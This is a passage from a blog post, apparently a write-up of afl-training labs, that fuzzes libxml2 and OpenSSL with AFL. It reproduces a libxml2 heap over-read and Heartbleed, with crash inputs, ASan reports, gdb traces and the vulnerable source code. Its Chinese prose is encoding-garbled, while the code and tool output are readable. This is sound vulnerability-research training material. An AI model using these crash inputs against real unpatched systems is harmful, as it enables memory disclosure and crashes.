&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêéÊïàÁéáÊèêÂçáÊúÄÈ´ò30x&lt;/p&gt;
&lt;h3 id=&#34;crashÂàÜÊûê&#34;&gt;crashÂàÜÊûêÔºö&lt;/h3&gt;
&lt;p&gt;4‰∏™Â∞èÊó∂8‰∏™unique crash&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223609962.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;‰ΩøÁî®&lt;code&gt;afl-tmin&lt;/code&gt;Á≤æÁÆÄinput:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*; do afl-tmin -i $i -o ./tmp/$i -m none -- ./fuzzer @@; done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;../fuzzer ËæìÂÖ•Êñá‰ª∂&lt;/code&gt;Êü•ÁúãÊä•Èîô‰ø°ÊÅØÔºåÂèëÁé∞ÊúâÂá†‰∏™ËæìÂÖ•Êñá‰ª∂ÈîôËØØÂèëÁîüÂú®&lt;code&gt;parser.c&lt;/code&gt;ÁöÑÁ¨¨10666Ë°åÔºåÂç≥ÈîôËØØÂèëÁîüÂú®ÂÆè&lt;code&gt;MOVETO_ENDTAG();&lt;/code&gt;‰∏≠ÔºåÂπ∂‰∏çÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÂ§çÁé∞ÁöÑ&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;ÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223617986.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰ΩøÁî®gdbË∞ÉËØïË∑üËøõÁ°ÆËÆ§ÈîôËØØÂá∫Áé∞Âú®ÂÆèÂÆö‰πâÂ§ÑÔºåÂπ∂‰∏çÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÂ§çÁé∞ÁöÑÈîôËØØ&lt;/p&gt;
&lt;p&gt;Â•ΩÂú®Êúâ‰∏Ä‰∏™ËæìÂÖ•Ê†∑Êú¨ËÉΩËß¶ÂèëCVE‰∏≠ÁöÑÈîôËØØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/ÊñáÊ°£/fuzzing/afl-training/challenges/libxml2/libxml2/opt/default/crashes/tmp$ hexdump -C id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 
00000000  3c 4a 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |&amp;lt;J00000000000000|
00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000350  30 30 3a 4a 30 30 30 30  30 30 30 30 30 30 30 30  |00:J000000000000|
00000360  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
000003b0  30 30 30 30 30 30 30 30  30 30                    |0000000000|
000003ba
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âç≥&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;ÂáΩÊï∞‰∏≠ÁöÑÊ∫¢Âá∫&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=================================================================
==3397754==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100000123c at pc 0x556c7cb6c531 bp 0x7ffe76acfde0 sp 0x7ffe76acfdd8
READ of size 1 at 0x62100000123c thread T0
    #0 0x556c7cb6c530 in xmlDictComputeFastQKey /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:489:18
    #1 0x556c7cb6a16f in xmlDictQLookup /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:1093:12
    #2 0x556c7cb79590 in xmlSAX2StartElementNs /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/libxml2/libxml2/SAX2.c:2238:17
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;binary ninjaÊü•ÁúãË∞ÉÁî®&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;ÂáΩÊï∞ÁöÑÂÅèÁßª&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223625979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbÊñ≠ÁÇπÊâìËøáÂéª:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb --args ../fuzzer id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 

b *$rebase(0x03de16b)

c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÂæóÂà∞Áõ∏ÂÖ≥ÂØÑÂ≠òÂô®ÂÄº&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; ‚ñ∫ 0x55555593216b &amp;lt;xmlDictQLookup+235&amp;gt;    call   xmlDictComputeFastQKey                &amp;lt;xmlDictComputeFastQKey&amp;gt;
        rdi: 0x6190000000d7 ‚óÇ‚Äî 0x303030303030304a (&#39;J0000000&#39;)
        rsi: 0x351
        rdx: 0x621000001528 ‚óÇ‚Äî &#39;J000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;
        rcx: 0x67
        r8: 0x2e70efeb

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê†πÊçÆ&lt;code&gt;dict.c&lt;/code&gt;‰∏≠ÂáΩÊï∞‰º†ÂèÇËßÑÂàôÔºåplenÂØπÂ∫î&lt;code&gt;$rsi&lt;/code&gt;ÔºålenÂØπÂ∫î&lt;code&gt;$rcx&lt;/code&gt;&lt;br&gt;
&lt;code&gt;len-(plen+1+1)&lt;/code&gt;Âç≥&lt;code&gt;0x67-(0x351+0x1+0x1)=-0x2EC&lt;/code&gt;&lt;br&gt;
‰∏ãÊ†áË¥üÊï∞,Êï∞ÁªÑË∂äÁïå&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static unsigned long
xmlDictComputeFastQKey(const xmlChar *prefix, int plen,
                       const xmlChar *name, int len, int seed)
{
    unsigned long value = (unsigned long) seed;

    if (plen == 0)
	value += 30 * (unsigned long) &#39;:&#39;;
    else
	value += 30 * (*prefix);

    if (len &amp;gt; 10) {
        value += name[len - (plen + 1 + 1)];
        len = 10;
	if (plen &amp;gt; 10)
	    plen = 10;
    }
    switch (plen) {
        case 10: value += prefix[9];
        case 9: value += prefix[8];
        case 8: value += prefix[7];
        case 7: value += prefix[6];
        case 6: value += prefix[5];
        case 5: value += prefix[4];
        case 4: value += prefix[3];
        case 3: value += prefix[2];
        case 2: value += prefix[1];
        case 1: value += prefix[0];
        default: break;
    }
    len -= plen;
    if (len &amp;gt; 0) {
        value += (unsigned long) &#39;:&#39;;
	len--;
    }
    switch (len) {
        case 10: value += name[9];
        case 9: value += name[8];
        case 8: value += name[7];
        case 7: value += name[6];
        case 6: value += name[5];
        case 5: value += name[4];
        case 4: value += name[3];
        case 3: value += name[2];
        case 2: value += name[1];
        case 1: value += name[0];
        default: break;
    }
    return(value);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;heartbleed&#34;&gt;heartbleed:&lt;/h2&gt;
&lt;h3 id=&#34;ÂâçË®Ä-2&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;Êú¨ÊñáËÆ∞ÂΩïafl-trainingÁöÑÁ¨¨‰∫åÁØáÔºåÂ§çÁé∞ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û&lt;/p&gt;
&lt;h3 id=&#34;ÂáÜÂ§áÂ∑•‰Ωú-2&#34;&gt;ÂáÜÂ§áÂ∑•‰ΩúÔºö&lt;/h3&gt;
&lt;p&gt;ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export CC=afl-clang-fast CXX=afl-clang-fast++ AFL_USE_ASAN=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂ÂêéÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./config -d
make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âú®ÂéüÊù•ÁöÑ&lt;code&gt;handshake.cc&lt;/code&gt;‰∏ä‰Ωú‰øÆÊîπÔºåÂú®&lt;code&gt;BIO_write&lt;/code&gt;ÂâçÂàùÂßãÂåñ&lt;code&gt;size&lt;/code&gt;Âíå&lt;code&gt;data&lt;/code&gt;Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// Copyright 2016 Google Inc. All Rights Reserved.
// Licensed under the Apache License, Version 2.0 (the &amp;quot;License&amp;quot;);
#include &amp;lt;openssl/ssl.h&amp;gt;
#include &amp;lt;openssl/err.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
#include &amp;lt;stddef.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#ifndef CERT_PATH
# define CERT_PATH
#endif

SSL_CTX *Init() {
  SSL_library_init();
  SSL_load_error_strings();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
  SSL_CTX *sctx;
  assert (sctx = SSL_CTX_new(TLSv1_method()));
  /* These two file were created with this command:
      openssl req -x509 -newkey rsa:512 -keyout server.key \
     -out server.pem -days 9999 -nodes -subj /CN=a/
  */
  assert(SSL_CTX_use_certificate_file(sctx, &amp;quot;server.pem&amp;quot;,
                                      SSL_FILETYPE_PEM));
  assert(SSL_CTX_use_PrivateKey_file(sctx, &amp;quot;server.key&amp;quot;,
                                     SSL_FILETYPE_PEM));
  return sctx;
}

int main() {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);

  /* TODO: To spoof one end of the handshake, we need to write data to sinbio
   * here */
  #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
  #endif
  uint8_t data[100] = {0};
  size_t size = read(STDIN_FILENO, data, 100);
  if (size == -1) {
    printf(&amp;quot;Failed to read from stdin\n&amp;quot;);
    return(-1);
  }
  BIO_write(sinbio, data, size);

  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁºñËØëÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ ./handshake.cc -I ./include ./libssl.a ./libcrypto.a -ldl -g -o handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ipt&lt;/code&gt;‰∏≠ÁîüÊàêÈöèÊú∫ÁßçÂ≠êÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd ipt &amp;amp;&amp;amp; dd if=/dev/urandom of=1.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂºÄÂßãfuzzÂâçÊ≥®ÊÑèÂ∞Ü&lt;code&gt;server.key server.pem&lt;/code&gt;ÊîæÂú®Âíå&lt;code&gt;handshake&lt;/code&gt;ÂêåÁõÆÂΩï‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -m none ./handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1696483359558.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;crashÂàÜÊûê-2&#34;&gt;crashÂàÜÊûêÔºö&lt;/h3&gt;
&lt;p&gt;Â∞Ü&lt;code&gt;handshake&lt;/code&gt;ÁßªËá≥&lt;code&gt;crashes&lt;/code&gt;ÁõÆÂΩï‰∏ã‰ΩøÁî®&lt;code&gt;afl-tmin&lt;/code&gt;ÁÆÄÂåñ&lt;code&gt;input&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./handshake;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πãÂêé‰ΩøÁî®ÁÆÄÂåñÂêéÁöÑ&lt;code&gt;input&lt;/code&gt;ÊµãËØï&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp$ gdb handshake 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;https://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.

For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from handshake...
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections &#39;&#39;
pwndbg&amp;gt; ls
handshake									 id:000006,sig:06,src:000236,time:22339456,execs:17321069,op:havoc,rep:7
id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1		 id:000007,sig:06,src:000233,time:23634783,execs:18301688,op:havoc,rep:3
id:000001,sig:06,src:000024+000075,time:4119745,execs:3210038,op:splice,rep:17	 id:000008,sig:06,src:000294+000226,time:25859527,execs:19982226,op:splice,rep:2
id:000002,sig:06,src:000053+000041,time:5079793,execs:3956550,op:splice,rep:4	 id:000009,sig:06,src:000270,time:26541712,execs:20500629,op:havoc,rep:1
id:000003,sig:06,src:000024+000068,time:10115665,execs:7871015,op:splice,rep:12  server.key
id:000004,sig:06,src:000040+000006,time:16647584,execs:12944780,op:splice,rep:4  server.pem
id:000005,sig:06,src:000224,time:22158868,execs:17184882,op:havoc,rep:4
This command is deprecated in Pwndbg. Please use the GDB&#39;s built-in syntax for running shell commands instead: !ls &amp;lt;args&amp;gt;
pwndbg&amp;gt; run &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
Starting program: /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
=================================================================
==7701==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 7701) fork to child process 7704]
[New inferior 2 (process 7704)]
[Detaching after fork from parent process 7701]
[Inferior 1 (process 7701) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 7704 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556f96d6 in __asan_memcpy (/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x555555744ca1 in tls1_process_heartbeat /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c:2586:3
    #2 0x5555557b9129 in ssl3_read_bytes /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_pkt.c:1092:4
    #3 0x5555557bdcd9 in ssl3_get_message /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_both.c:457:7
    #4 0x555555786696 in ssl3_get_client_hello /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:941:4
    #5 0x5555557823ec in ssl3_accept /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:357:9
    #6 0x555555737a7f in main /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/./handshake.cc:53:3
    #7 0x7ffff7829d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7ffff7829e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #9 0x555555677564 in _start (/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x123564) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)

0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)
allocated by thread T0 here:
    #0 0x5555556fa3ae in malloc (/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a63ae) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x5555557f0ee9 in CRYPTO_malloc /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/crypto/mem.c:308:8

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&amp;gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa
  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7701==ABORTING
[Inferior 2 (process 7704) exited normally]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÆö‰ΩçÂà∞&lt;code&gt;t1_lib.c&lt;/code&gt;‰∏≠ÁöÑ&lt;code&gt;tls1_process_heartbeat&lt;/code&gt;ÁöÑ&lt;code&gt;memcpy(bp, pl, payload);&lt;/code&gt;Âç≥ÊòØËß¶ÂèëÂøÉËÑèÊª¥Ë°ÄÁöÑÂÖ≥ÈîÆ‰ª£Á†Å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*RIP  0x555555744c9d (tls1_process_heartbeat+765) ‚óÇ‚Äî call 0x5555556f9520
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM / x86-64 / set emulate on ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
   0x555555744c89 &amp;lt;tls1_process_heartbeat+745&amp;gt;    jne    tls1_process_heartbeat+1249                &amp;lt;tls1_process_heartbeat+1249&amp;gt;
 
   0x555555744c8f &amp;lt;tls1_process_heartbeat+751&amp;gt;    mov    byte ptr [rbx + 2], r12b
   0x555555744c93 &amp;lt;tls1_process_heartbeat+755&amp;gt;    lea    rdi, [rbx + 3]
   0x555555744c97 &amp;lt;tls1_process_heartbeat+759&amp;gt;    mov    rsi, r15
   0x555555744c9a &amp;lt;tls1_process_heartbeat+762&amp;gt;    mov    rdx, rbp
 ‚ñ∫ 0x555555744c9d &amp;lt;tls1_process_heartbeat+765&amp;gt;    call   __asan_memcpy                &amp;lt;__asan_memcpy&amp;gt;
        rdi: 0x62b000000203 ‚óÇ‚Äî 0xbebebebebebebebe
        rsi: 0x62900000520b ‚óÇ‚Äî 0xbebebebebebebebe
        rdx: 0x6430
        rcx: 0x55555662f720 (__afl_area_initial) ‚óÇ‚Äî 0x1000000000002
 
   0x555555744ca2 &amp;lt;tls1_process_heartbeat+770&amp;gt;    lea    rdi, [rbx + rbp]
   0x555555744ca6 &amp;lt;tls1_process_heartbeat+774&amp;gt;    add    rdi, 3
   0x555555744caa &amp;lt;tls1_process_heartbeat+778&amp;gt;    mov    esi, 0x10
   0x555555744caf &amp;lt;tls1_process_heartbeat+783&amp;gt;    call   RAND_pseudo_bytes                &amp;lt;RAND_pseudo_bytes&amp;gt;
 
   0x555555744cb4 &amp;lt;tls1_process_heartbeat+788&amp;gt;    mov    rdi, qword ptr [rsp + 0x10]
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ SOURCE (CODE) ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
In file: /home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c
   2581                 bp = buffer;
   2582                 
   2583                 /* Enter response type, length and copy payload */
   2584                 *bp++ = TLS1_HB_RESPONSE;
   2585                 s2n(payload, bp);
 ‚ñ∫ 2586                 memcpy(bp, pl, payload);
   2587                 bp += payload;
   2588                 /* Random padding */
   2589                 RAND_pseudo_bytes(bp, padding);
   2590 
   2591                 r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
